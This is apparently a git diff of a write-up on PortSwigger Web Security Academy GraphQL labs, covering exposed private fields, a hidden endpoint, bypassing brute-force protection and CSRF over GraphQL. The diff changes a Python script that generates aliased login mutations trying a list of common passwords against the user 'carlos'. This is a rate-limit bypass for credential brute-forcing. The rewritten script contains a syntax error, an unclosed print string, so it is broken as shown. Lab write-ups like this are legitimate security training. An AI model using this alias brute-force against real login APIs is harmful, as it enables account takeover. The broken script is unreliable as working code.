@@ -2,16 +2,16 @@
 
 This write-up focuses on the following **PRACTITIONER-level labs** from the PortSwigger Web Security Academy related to **GraphQL API Vulnerabilities**:
 
-**Accidental exposure of private GraphQL fields**  
+**2 Accidental exposure of private GraphQL fields**  
 This lab demonstrates how attackers can enumerate GraphQL schema and access fields that should not be exposed to unauthorized users.
 
-**Finding a hidden GraphQL endpoint**  
+**3 Finding a hidden GraphQL endpoint**  
 This lab shows techniques to discover undisclosed GraphQL API endpoints that may not be directly linked or documented.
 
-**Bypassing GraphQL brute force protections**  
+**4 Bypassing GraphQL brute force protections**  
 This lab demonstrates methods for bypassing brute-force protection mechanisms implemented in GraphQL APIs.
 
-**Performing CSRF exploits over GraphQL**  
+**5 Performing CSRF exploits over GraphQL**  
 This lab shows how attackers can exploit CSRF vulnerabilities via GraphQL queries to perform unauthorized actions on behalf of users.
 
 ---
@@ -573,21 +573,33 @@ We will create  python script to create alias like we neededin above scnerio to 
 To get the password of carlos
 **Note**:password are already provided to us
 
-`passwords = "123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow".split(',')`
-```
-mutations = []
-for index, element in enumerate(passwords):
-    mutation = f"""
-    bruteforce{index}: login(input: {{ password: "{element}", username: "carlos" }}) {{
-        token
-        success
-    }}
-    """
-    mutations.append(mutation)
 
-query = "\n".join(mutations)
-print(query)
+**Note**: passwords are already provided to us
+
+
+```python
+passwords = [
+    "123456", "password", "12345678", "qwerty", "123456789", "football",
+    # ... paste the full list from https://portswigger.net/web-security/authentication/auth-lab-passwords here
+    # There are usually ~100 common passwords in the lab list
+]
+
+print("{% raw %}")
+print("```graphql
+print("mutation BruteForceCarlos {")
+
+for i, pwd in enumerate(passwords, 1):
+    print(f"  attempt{i}: login(input: {{ username: \"carlos\", password: \"{pwd}\" }}) {{")
+    print("    success")
+    print("    token")
+    print("  }")
+
+print("}")
+print("```")
+print("{% endraw %}")
 ```
+
+
 We have run script in reptile and we have get the payload
 
 <img width="1350" height="554" alt="image" src="https://github.com/user-attachments/assets/9476cf04-c6cc-44c4-9302-42dd02696140" />
@@ -667,3 +679,4 @@ Store and deliver to victum and lab is solved
 
 
 ---
+
